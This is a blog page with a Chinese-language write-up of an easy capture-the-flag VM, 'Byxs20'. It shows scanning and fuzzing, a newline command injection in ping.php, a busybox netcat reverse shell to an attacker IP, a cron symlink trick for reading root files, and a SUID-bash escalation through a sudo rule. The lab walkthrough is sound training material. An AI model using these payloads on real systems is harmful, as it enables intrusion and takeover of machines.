@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPH.github.io/plugins/theme.js'></script><script src='https://7r1UMPH.github.io/plugins/StatsSidebar.js'></script>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
+<meta name="description" content="*   **靶机名称:** Byxs20 (内部测试 - 可能发布于 HackMyVm)
+*   **难度:** 简单 (Easy)
+*   **目标:** 获取 user.txt 和 root.txt 文件中的 flag。">
+<meta property="og:title" content="Byxs20靶机渗透测试报告 (Write-Up)">
+<meta property="og:description" content="*   **靶机名称:** Byxs20 (内部测试 - 可能发布于 HackMyVm)
+*   **难度:** 简单 (Easy)
+*   **目标:** 获取 user.txt 和 root.txt 文件中的 flag。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png">
+<title>Byxs20靶机渗透测试报告 (Write-Up)</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Byxs20靶机渗透测试报告 (Write-Up)</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/58" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><ul>
+<li><strong>靶机名称:</strong> Byxs20 (内部测试 - 可能发布于 HackMyVm)</li>
+<li><strong>难度:</strong> 简单 (Easy)</li>
+<li><strong>目标:</strong> 获取 user.txt 和 root.txt 文件中的 flag。</li>
+<li><strong>关键点:</strong> Web 命令注入、Cron 任务利用、Sudo 提权</li>
+</ul>
+<hr>
+<h2>1. 信息收集 (Enumeration)</h2>
+<p>初始阶段的目标是尽可能多地了解目标系统。</p>
+<ul>
+<li>
+<p><strong>网络发现 (arp-scan):</strong><br>
+使用 <code class="notranslate">arp-scan</code> 扫描本地网络，发现目标靶机的 IP 地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo arp-scan -l</pre></div>
+<p>锁定目标 IP 为 <code class="notranslate">192.168.205.194</code>。</p>
+</li>
+<li>
+<p><strong>端口扫描 (nmap):</strong><br>
+对目标 IP 进行全端口 TCP 扫描，识别开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -p- 192.168.205.194</pre></div>
+<p>发现开放了两个关键端口：</p>
+<ul>
+<li><code class="notranslate">22/tcp</code>: SSH 服务</li>
+<li><code class="notranslate">80/tcp</code>: HTTP 服务 (Web 服务器)</li>
+</ul>
+</li>
+<li>
+<p><strong>Web 内容发现 (gobuster):</strong><br>
+针对 80 端口的 Web 服务进行目录和文件枚举。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak</pre></div>
+<p>发现以下值得关注的路径和文件：</p>
+<ul>
+<li><code class="notranslate">/index.html</code>: 网站首页。</li>
+<li><code class="notranslate">/templates/</code>: 存在目录列表，包含 <code class="notranslate">about.html</code>, <code class="notranslate">contact.html</code>, <code class="notranslate">home.html</code> 等模板文件。</li>
+<li><code class="notranslate">/template.php</code>: 一个 PHP 脚本，似乎用于加载模板。</li>
+<li><code class="notranslate">/conf/</code>: 同样存在目录列表，可能存放配置文件。</li>
+<li><code class="notranslate">/ping.php</code>: 另一个 PHP 脚本，名字暗示其功能与网络 ping 相关。</li>
+</ul>
+</li>
+</ul>
+<h2>2. 获取初步立足点 (www-data 权限)</h2>
+<ul>
+<li>
+<p><strong>分析 Web 功能:</strong></p>
+<ul>
+<li>尝试访问 <code class="notranslate">/template.php</code>，发现可以通过 <code class="notranslate">?page=</code> 参数加载 <code class="notranslate">/templates/</code> 目录下的文件（如 <code class="notranslate">?page=about</code> 会包含 <code class="notranslate">about.php</code>）。这暗示存在 LFI (本地文件包含) 漏洞。</li>
+<li>进一步测试 LFI，尝试读取 <code class="notranslate">/etc/passwd</code> (<code class="notranslate">?page=../../../../etc/passwd</code>) 失败。错误信息显示脚本在路径末尾强制添加了 <code class="notranslate">.php</code> 后缀。</li>
+<li><strong>重要发现:</strong> 尝试包含脚本自身 (<code class="notranslate">?page=../template</code>) 也失败了，并返回 <code class="notranslate">No such file or directory</code>。这强烈暗示 PHP 配置了 <code class="notranslate">open_basedir</code>，限制了文件包含的范围，使得这个 LFI 漏洞难以直接利用来读取敏感文件。</li>
+</ul>
+</li>
+<li>
+<p><strong>探索 <code class="notranslate">ping.php</code>:</strong></p>
+<ul>
+<li>直接访问 <code class="notranslate">ping.php</code> 返回 "Invalid IP!"。</li>
+<li>使用 <code class="notranslate">ip</code> 参数 (<code class="notranslate">ping.php?ip=127.0.0.1</code>) 可以成功执行 ping 命令。</li>
+</ul>
+</li>
+<li>
+<p><strong>发现隐藏参数 (wfuzz):</strong><br>
+使用 <code class="notranslate">wfuzz</code> 对 <code class="notranslate">ping.php</code> 进行参数 Fuzzing，寻找除 <code class="notranslate">ip</code> 之外的其他参数。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?FUZZ=127.0.0.1<span class="pl-pds">"</span></span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2</pre></div>
+<p>发现了一个名为 <code class="notranslate">debug</code> 的参数。</p>
+</li>
+<li>
+<p><strong>命令注入 (Command Injection):</strong><br>
+<strong>核心发现：</strong> 单独使用 <code class="notranslate">ip</code> 参数只能执行 ping，单独使用 <code class="notranslate">debug</code> 参数（如果有效）也无法直接 RCE。<strong>必须将 <code class="notranslate">ip</code> 和 <code class="notranslate">debug</code> 参数结合起来</strong>，才能触发命令注入漏洞。<br>
+测试命令注入：使用 <code class="notranslate">%0A</code> (URL 编码的换行符) 在 <code class="notranslate">ip</code> 参数中附加 <code class="notranslate">id</code> 命令，并同时加上 <code class="notranslate">debug=1</code> 参数。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&amp;debug=1<span class="pl-pds">"</span></span></pre></div>
+<p>返回的输出包含了 <code class="notranslate">[*] Debug Mode Activated</code>、<code class="notranslate">[+] Raw Command: ping -c 3 127.0.0.1\nid</code> 以及 <code class="notranslate">id</code> 命令的执行结果 (<code class="notranslate">uid=33(www-data)...</code>)，确认了命令注入！</p>
+</li>
+<li>
+<p><strong>获取反弹 Shell (Reverse Shell):</strong><br>
+利用这个命令注入点获取反向 Shell。</p>
+<ol>
+<li>
+<p>在攻击机上设置 Netcat 监听：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+</li>
+<li>
+<p>构造并发送反弹 Shell 的 payload。使用 <code class="notranslate">busybox nc</code> 提高兼容性，并对 payload 进行 URL 编码。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> Payload: busybox nc [你的攻击机IP] 8888 -e /bin/bash</span>
+<span class="pl-c"><span class="pl-c">#</span> URL 编码后: busybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash</span>
+curl <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash&amp;debug=1<span class="pl-pds">"</span></span></pre></div>
+<p>将 <code class="notranslate">[你的攻击机IP]</code> 替换为你的 IP。执行后，<code class="notranslate">nc</code> 监听端应收到连接。</p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>升级 Shell:</strong><br>
+为了更好的交互体验，将获取到的基础 Shell 升级为标准的 TTY。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在反弹 Shell 中</span>
+script /dev/null -c bash
+<span class="pl-c"><span class="pl-c">#</span> 按 Ctrl+Z</span>
+<span class="pl-c"><span class="pl-c">#</span> 在攻击机终端</span>
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+<span class="pl-c"><span class="pl-c">#</span> 按两次 Enter</span>
+<span class="pl-c"><span class="pl-c">#</span> 回到反弹 Shell</span>
+reset xterm
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 40 columns 178 <span class="pl-c"><span class="pl-c">#</span> 根据实际终端调整</span></pre></div>
+<p>现在你拥有了一个稳定的 <code class="notranslate">www-data</code> 权限 Shell。</p>
+</li>
+</ul>
+<h2>3. 权限提升 (Privilege Escalation)</h2>
+<ul>
+<li>
+<p><strong>进程监控与 Cron 任务发现 (pspy):</strong><br>
+上传并运行 <code class="notranslate">pspy64</code> 工具来监控系统进程，寻找提权机会。</p>
+<ol>
+<li>
+<p>在攻击机上开启 HTTP 服务以提供 <code class="notranslate">pspy64</code>。</p>
+</li>
+<li>
+<p>在目标机 <code class="notranslate">/tmp</code> 目录下下载并运行 <code class="notranslate">pspy64</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在目标机 www-data Shell 中</span>
+<span class="pl-c1">cd</span> /tmp
+busybox wget http://[你的攻击机IP]/pspy64
+chmod +x pspy64
+./pspy64</pre></div>
+<p><code class="notranslate">pspy64</code> 的输出揭示了一个以 root 权限 (<code class="notranslate">UID=0</code>) 定期执行的 Cron 任务：</p>
+</li>
+</ol>
+<pre class="notranslate"><code class="notranslate">2025/04/20 09:42:01 CMD: UID=0 PID=658 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak /etc/apache2/apache2.conf
+</code></pre>
+<p>这个任务每分钟会将 <code class="notranslate">/var/www/html/conf/apache2.conf.bak</code> 覆盖到 <code class="notranslate">/etc/apache2/apache2.conf</code>。由于 <code class="notranslate">www-data</code> 用户通常对 <code class="notranslate">/var/www/html/conf</code> 目录有写权限，这成为了提权的关键。</p>
+</li>
+<li>
+<p><strong>提权方法 1: Cron + 符号链接任意文件读取</strong><br>
+利用 Cron 任务覆盖文件的行为，通过创建符号链接来读取任意文件。</p>
+<ol>
+<li>
+<p><strong>读取 user flag:</strong> 将 <code class="notranslate">apache2.conf.bak</code> 链接到 <code class="notranslate">user.txt</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /var/www/html/conf
+ln -sf /home/welcome/user.txt apache2.conf.bak</pre></div>
+</li>
+<li>
+<p>等待 Cron 任务执行（最多 1 分钟）。</p>
+</li>
+<li>
+<p>读取被覆盖后的 Apache 配置文件，即得到 <code class="notranslate">user.txt</code> 的内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/apache2/apache2.conf
+<span class="pl-c"><span class="pl-c">#</span> -&gt; flag{user-05659dca555d4ddbc396b319645f3d2a}</span></pre></div>
+</li>
+<li>
+<p><strong>读取 root flag:</strong> 删除旧链接，创建新链接指向 <code class="notranslate">root.txt</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rm apache2.conf.bak
+touch apache2.conf.bak
+ln -sf /root/root.txt apache2.conf.bak</pre></div>
+</li>
+<li>
+<p>再次等待 Cron 任务执行。</p>
+</li>
+<li>
+<p>读取 Apache 配置文件得到 <code class="notranslate">root.txt</code> 的内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/apache2/apache2.conf
+<span class="pl-c"><span class="pl-c">#</span> -&gt; flag{root-f9ef88715e3bbec612f9f88d64ae3a99}</span></pre></div>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>提权方法 2: Cron 修改配置 + 用户切换 + Sudo 提权</strong><br>
+这是一个更曲折但同样有效的方法。</p>
+<ol>
+<li>
+<p><strong>修改 Apache 配置:</strong> 利用 Cron 任务，修改 Apache 的运行用户为 <code class="notranslate">welcome</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /var/www/html/conf
+nano apache2.conf.bak
+User welcome
+Group welcome</pre></div>
+</li>
+<li>
+<p>等待 Cron 执行，并让 Apache 服务以新用户身份运行（可以直接<code class="notranslate">sudo /usr/sbin/reboot</code>）。</p>
+</li>
+<li>
+<p><strong>获取 <code class="notranslate">welcome</code> Shell:</strong> 再次使用之前的命令注入获取反弹 Shell。连接后确认用户身份。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> ... 获取反弹 Shell ...</span>
+id
+<span class="pl-c"><span class="pl-c">#</span> 应显示 uid=1000(welcome) ...</span></pre></div>
+</li>
+<li>
+<p><strong>检查 Sudo 权限:</strong> 作为 <code class="notranslate">welcome</code> 用户，查看其 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l</pre></div>
+<p>发现 <code class="notranslate">welcome</code> 可以无密码执行 <code class="notranslate">/home/welcome/test/test</code>。</p>
+</li>
+<li>
+<p><strong>利用 Sudo 规则:</strong> 由于 <code class="notranslate">welcome</code> 可以控制 <code class="notranslate">test/test</code> 脚本的内容，可以构造恶意脚本。</p>
+</li>
+<li>
+<p>创建脚本，赋予 <code class="notranslate">/bin/bash</code> SUID 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">mv /home/welcome/test /home/welcome/test1
+mkdir /home/welcome/test
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /home/welcome/test/test
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod u+s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> /home/welcome/test/test
+chmod +x /home/welcome/test/test</pre></div>
+</li>
+<li>
+<p>通过 <code class="notranslate">sudo</code> 执行该脚本。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo /home/welcome/test/test</pre></div>
+</li>
+<li>
+<p><strong>获取 Root:</strong> 执行带有 SUID 权限的 <code class="notranslate">bash</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash -p
+id
+<span class="pl-c"><span class="pl-c">#</span> 应显示 euid=0(root)</span></pre></div>
+<p>成功获取 root 权限。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2>4. 获取 Flag</h2>
+<ul>
+<li><strong>User Flag:</strong> <code class="notranslate">flag{user-05659dca555d4ddbc396b319645f3d2a}</code> (位于 <code class="notranslate">/home/welcome/user.txt</code>)</li>
+<li><strong>Root Flag:</strong> <code class="notranslate">flag{root-f9ef88715e3bbec612f9f88d64ae3a99}</code> (位于 <code class="notranslate">/root/root.txt</code>)</li>
+</ul></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src='https://7r1UMPH.github.io/plugins/TOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>
+
+</html>
